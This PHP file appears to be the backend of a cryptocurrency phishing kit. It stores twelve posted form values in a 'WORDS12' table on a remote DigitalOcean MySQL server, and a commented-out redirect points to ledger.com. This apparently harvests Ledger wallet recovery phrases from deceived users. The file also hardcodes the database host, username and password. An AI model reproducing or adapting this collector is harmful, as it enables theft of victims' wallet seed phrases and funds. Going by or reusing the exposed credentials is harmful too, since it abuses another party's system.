<?php
// header("Location: https://www.ledger.com/");
function debug_to_console($data)
{
    $output = $data;
    if (is_array($output))
        $output = implode(',', $output);

    echo "<script>console.log('Debug Objects: " . $output . "' );</script>";
}

$servername = "id20976474-testdb-do-user-14283264-0.b.db.ondigitalocean.com:25060";
$database = "id20976474-testdb";
$username = "id20976474-testdb";
$password = "AVNS_6Z4_IMdH9NyGayFFdlz";
$sql = "mysql:host=$servername;dbname=$database;";
$dsn_Options = [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION];
// Create a new connection to the MySQL database using PDO, $my_Db_Connection is an object
try {
    $my_Db_Connection = new PDO($sql, $username, $password, $dsn_Options);
    debug_to_console("Connected successfully");
} catch (PDOException $error) {
    debug_to_console('Connection error: ' . $error->getMessage());
}
// Set the variables for the person we want to add to the database
$word01 = "Tom1";
$word02 = "Tom2";
$word03 = "Tom3";
$word04 = "Tom4";
$word05 = "Tom5";
$word06 = "Tom6";
$word07 = "Tom7";
$word08 = "Tom8";
$word09 = "Tom9";
$word10 = "Tom10";
$word11 = "Tom11";
$word12 = "Tom12";
// Here we create a variable that calls the prepare() method of the database object
// The SQL query you want to run is entered as the parameter, and placeholders are written like this :placeholder_name
$my_Insert_Statement = $my_Db_Connection->prepare("INSERT INTO WORDS12 (word01, word02, word03, word04, word05, word06, word07, word08, word09, word10, word11, word12) VALUES (:word01, :word02, :word03, :word04, :word05, :word06, :word07, :word08, :word09, :word10, :word11, :word12)");
// Now we tell the script which variable each placeholder actually refers to using the bindParam() method
// First parameter is the placeholder in the statement above - the second parameter is a variable that it should refer to
// $my_Insert_Statement->bindParam(":word01", $word01);
// $my_Insert_Statement->bindParam(":word02", $word02);
// $my_Insert_Statement->bindParam(":word03", $word03);
// $my_Insert_Statement->bindParam(":word04", $word04);
// $my_Insert_Statement->bindParam(":word05", $word05);
// $my_Insert_Statement->bindParam(":word06", $word06);
// $my_Insert_Statement->bindParam(":word07", $word07);
// $my_Insert_Statement->bindParam(":word08", $word08);
// $my_Insert_Statement->bindParam(":word09", $word09);
// $my_Insert_Statement->bindParam(":word10", $word10);
// $my_Insert_Statement->bindParam(":word11", $word11);
// $my_Insert_Statement->bindParam(":word12", $word12);

// // Execute the query using the data we just defined
// // The execute() method returns TRUE if it is successful and FALSE if it is not, allowing you to write your own messages here
// if ($my_Insert_Statement->execute()) {
//     debug_to_console("New record created successfully");
// } else {
//     debug_to_console("Unable to create record");
// }
// At this point, you can change the data of the variables and execute again to add more data to the database
// $first_Name = "John";
// $last_Name = "Smith";
// $email = "john.smith@domain.tld";

// // Execute again now that the variables have changed
// if ($my_Insert_Statement->execute()) {
//   debug_to_console("New record created successfully");
// } else {
//   debug_to_console("Unable to create record");
// }

$array = new SplFixedArray(12);
$number = 0;

if (isset($_POST)) {
    foreach ($_POST as $inputName => $inputValue) {
        debug_to_console($inputName); //This is the name of an input field
        debug_to_console($inputValue); //This is the value of the input field

        $array[$number] = $inputValue;

        $number++;
    }

    $my_Insert_Statement->bindParam(":word01", $array[0]);
    $my_Insert_Statement->bindParam(":word02", $array[1]);
    $my_Insert_Statement->bindParam(":word03", $array[2]);
    $my_Insert_Statement->bindParam(":word04", $array[3]);
    $my_Insert_Statement->bindParam(":word05", $array[4]);
    $my_Insert_Statement->bindParam(":word06", $array[5]);
    $my_Insert_Statement->bindParam(":word07", $array[6]);
    $my_Insert_Statement->bindParam(":word08", $array[7]);
    $my_Insert_Statement->bindParam(":word09", $array[8]);
    $my_Insert_Statement->bindParam(":word10", $array[9]);
    $my_Insert_Statement->bindParam(":word11", $array[10]);
    $my_Insert_Statement->bindParam(":word12", $array[11]);

    if ($my_Insert_Statement->execute()) {
        debug_to_console("New record created successfully");
    } else {
        debug_to_console("Unable to create record");
    }
}


exit();
